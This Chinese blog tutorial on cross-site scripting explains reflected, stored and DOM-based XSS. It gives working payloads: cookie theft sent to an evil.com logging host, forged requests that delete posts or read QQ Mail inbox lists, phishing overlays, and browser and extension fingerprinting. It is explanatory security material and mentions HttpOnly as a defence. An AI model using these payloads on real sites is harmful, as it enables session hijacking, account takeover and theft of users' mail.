---
title: 带你玩转跨站脚本攻击cross site script
description: 带你玩转跨站脚本攻击cross site script
keywords: 跨站脚本攻击，cross site script，网站安全
date: 2016-11-18 09:56
tags: javascript
---
> 跨站脚本攻击 cross site script

      通常指黑客通过“HTML注入”纂改了页面，插入了恶意的脚本，从而在用户浏览页面时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫“跨站脚本”。但是发展到今天，由于Javascript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，这个名字保留了下来。

假设一个页面把用户输入的参数输出到页面上：

```php
<?php
$input=$_GET[“param”];
echo “<div>”.$input.”</div>”;
?>
```
如果提交一段HTML代码:

```html
http://inqiu.com/test.php?param=<script>alert(/xss/)</script>
```

会发现alert(/xss/)被执行了。

XSS分为以下几类:

1. 反射型XSS: 只是简单地把用户输入的数据反射给浏览器，黑客需要诱使用户点击链接。也叫作”非持久型XSS“(Non-persistent XSS)

2. 存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。 比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代        码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做”存储型XSS”。存储型XSS也叫持久性XSS

3. DOM based XSS:从效果上来说也是一种反射型XSS。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。

看如下代码:

```html
<script>
function test(){
var str=document.getElementById(“text”).value;
document.getElementById(“t”).innerHTML=”<a href='”+str+”‘ >testLink</a>”;
}
</script>
<div id=”t”></div>
<input type=”text” id=”text” value=”” />
<input type=”button” id=”s” value=”write” onlick=”test()” />
```
这段代码的作用就是点击write按钮后在当前页面插入一个链接。

在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，这就造成了DOM based XSS

构造如下数据:
‘ onclick=alert(/xss/) //

输入后，页面代码就成了

<a href=” onlick=alert(/xss/) //’ >testLink </a>

首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符//注释掉第二个单引号。 这里为什么需要onclick，是通过on事件触发？

实际上，这里还有另外一种利用方式—除了构造一个新事件外，还可以选择闭合掉< a >标签，并插入一个新的HTML标签。尝试如下输入:

```html
‘><img scr=# onerror=alert(/xss2/) /><‘

//页面代码编程

<a href=”><img scr=# onerror=alert(/xss2/) /><”>testLink</a> // 这里是onerror事件
```

> XSS攻击进阶:

1)初探XSS Payload:

XSS Payload就是JavaScript脚本(还可以是Flash或其他富客户端的脚本)，所以任何Javascript脚本能做到的事情，XSS Payload都能做到。

一个最常见的XSS Payload就是读取浏览器的Cookie对象，从而发起”Cookie劫持”攻击。

Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不用通过密码，而直接登录进用户的账户。

如下所示，攻击者先加载一个远程脚本:

```html
http://www.a.com/test.htm?abc=”><script scr=http://www.evil.com/evil.js ></script>
```

真正的XSS Payload现在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。

在evil.js中，可以通过如下代码窃取Cookie:

```html
var img=document.createElement(“img”);    创建一个img对象

img.src=”http://www.evil.com/log?”+escape(document.cookie);

document.body.appendChild(img);        将img对象插入到节点
```

这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。

事实上，http: //www .evil.com/log  并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录。

这样就完成了一个最简单的窃取Cookie的XSS Payload。

黑客可以用这个Cookie直接登录。

防止:Cookie的“HttpOnly”标识可以防止”Cookie劫持”，我们将在稍后的章节中在具体介绍。HttpOnly表明cookie存在于http层面，不能被客户端脚本读取

 2)强大的XSS Payload:
 
cookie劫持并非每次都有效，有的网站会在set-cookie时给关键cookie植入httponly标识，有的网站则会吧cookie与客户端ip绑定

a)网站上的应用，只需要接受HTTP的GET POST请求，即可完成所有操作，那么可以通过javascript构造GET POST请求就可以让应用执行操作。

例如在Sohu上有一篇文章， 想通过XSS删除它，该如何做呢?

假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下:

正常删除该文章的链接是:

http://inqiu.com/manage/entry.do?m=delete&id=156713012

对于攻击者来说，只需要直到文章的id，就能够通过这个请求删除这篇文章了。

攻击者可以通过插入一张图片来发起一个get请求:

```javascript
var img=document.createElement(“img”);
img.scr=”http://blog.sohu.com/manage/entry.do?m=delete&id=156713012″;
document.body.appendChild(img);
```
攻击者只需要让博客的作者执行这段JavaScript代码(XSS Payload)，就会把这篇文章删除。在具体攻击中，攻击者将通过XSS诱使用户执行XSS Payload。

如果网站应用者接受POST请求，那么攻击者如何实施XSS攻击呢?

攻击者将通过Javascript发出一个post请求            在分析的过程中，可以先抓正常提交表单是的post包，然后构造

第一种方法是构造一个form表单，然后自动提交这个表单:

```javascript
var f=document.createElement(“form”);
f.action=””;
f.method=”post”;
document.body.appendChild(f);

var i1=document.createElement(“input”);
i1.name=” ck”;
i1.value=” JiuY”;
f.appendChild(i1);

var i2=document.createElement(“input”);
i2.name=” mb_text”;
i2.value=”testtestseset”;
f.appendChild(i2);

f.submit();
```
如果表单参数很多的话，通过构造DOM的方式，代码将会很冗长。所以可以直接写HTML代码:

```javascript
var dd=document.createElement(“div”);
document.body.appendChild(dd);
dd.innerHTML='<form action=”” method=”post” id=”xssform” name=”mbform”>’+
‘<input type=”hidden” name=”ck” value=”JiuY” />’+
‘<input type=”hidden” name=”mb_text” value=”testetst” />’ +
‘</form>’

document.getElementById(“xssform”).submit();
```
第二种方法是，通过XMLHttpRequest发送一个POST请求:

```javascript
var url=”http://www.douban.com”;
var postStr=”ck=JiuY&mb_text=test1234″;
var ajax=null;
if (window.XMLHttpRequest){
	ajax=new XMLHttpRequest();
} else if (window.ActiveXObject){
	ajax=new ActiveXObject(“Microsoft.XMLHTTP”);
} else {
	return;
}

ajax.open(“POST”,url,true);
ajax.setRequestHeader(“Content-Type”,”application/x-www-form-urlencoded”);
ajax.send(postStr);

ajax.onreadystatechange=function(){
  if (ajax.readyState==4 && ajax.status==200){
  	alert(“Done”);
  }
}
```

可以看出，在XSS攻击后，除了可以实施cookie劫持外，还能够通过模拟GET POST请求操纵用户的浏览器。

下面的例子将演示如何通过XSS Payload读取QMail用户的邮件文件夹:

首先看看正常的请求是如何获取到所有的邮件列表的。登录邮箱后，点击“收件箱”后。抓包发现浏览器发出了如下请求:

http://m57.mail.qq.com/cgi-bing/mail_list?sid=6a1hx3p5yzh…&folderid=1&page=0&s=index&loc=folderlist,,,1


经过分析，真正能访问到邮件列表的链接是:

http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=6a1hx…

这里有一个无法直接构造出的值:sid。从字面推测，这个sid参数应该是用户ID加密后的值。

所以XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求到此URL，应该就能得到邮件列表了。XSS Payload如下:

```javascript
if (top.window.location.href.indexOf(“sid=”)>0){
	var sid=top.window..location.href.substr(top.window.location.href.indexOf(“sid=”)+4,24);
}

var folder_url=”http://”+top.window.location.host+”/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=”+sid;

var ajax=null;
if (window.XMLHttpRequest){
	ajax=new XMLHttpRequest();
} else if (window.ActiveXObject){
	ajax=new ActiveXObject(“Microsoft.XMLHTTP”);
} else {
	return;
}

ajax.open(“GET”,folder_url,true);
ajax.send(null);

ajax.onreadystatechange=function(){
  if (ajax.readyState==4 && ajax.status==200){
	  alert(ajax.responseText);
	  //document.write(ajax.responseText);
  }
}
```

邮件列表的内容成功被XSS Payload获取到。

b)钓鱼:

XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”,碰到验证码，和修改密码时需要输入旧密码，XSS Payload就会失效。

对于验证码，XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施–攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。

修改密码的问题比较复杂，为了窃取密码，攻击者可以将XSS与”钓鱼”结合。

实现思路很简单:利用Javascript在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。

c)识别用户浏览器:

通过识别用户的浏览器、操作系统就可以执行一次精准的内存攻击

可以通过javascript脚本识别浏览器版本：

1，通过XSS读取浏览器的UserAgent对象：alert(navigator.userAgent);
但是userAgent是可以伪造的。这个信息不一定准确。

2，由于浏览器之间的实现存在差异，利用这种差异分辨浏览器几乎不会错误。
通过如下代码；

```javascript
B=(function x(){})[-5]==’x’?’FF3′:(function
x(){})[-6]==’x’?’FF2′:/a/[-1]==’a’?’FF’:’\v’==’v’?’IE’:/a/.__proto__==’//’?’Saf’:/s/.
test(/a/.toString)?’Chr’:/^function \(/.test[].sort)?’Op’:’Unknow’
```
3，识别用户安装的软件:
在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”–黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。
看如下代码:
```javascript
try {
	var Obj=new ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);
} catch (e){
	//异常了，不存在该控件
}
```
通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。

一些第三方软件也可能会泄漏一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。

在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript。

Firefox的插件(Plugins)列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件:

所以直接查询”navigator.plugins”对象，就能找到所有的插件了。例如 navigator.plugins[0]

Firefox的扩展(extension)：通过检测扩展的图标，来判断某个特定的扩展是否存在。

在firefox中有一个特殊的协议: chrome:// ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:

chrome://flashgot/skin/icon32.png

扫描firefox扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。

```javascript
var m=new Image();
m.onload=function(){
	alert(1);//图片存在
};
m.onerror=function(){
	alert(2);//图片不存在
};
m.src=”chrome://flashgot/skin/icon32.png”; //连接图片
```

 4，CSS History Hack:
 
另一种XSS Payload—通过CSS，来发现一个用户曾经访问过的网站。

原理是利用style的visited属性—如果用户曾经访问过某个链接，那么这个链接的颜色会变的与众不同。

```javascript
<body>
<a href=# >曾经访问过</a>
<a href=”notexist”>未曾经访问过</a>
</body>
```
往上存在利用POC，firefox已经修补了这个漏洞


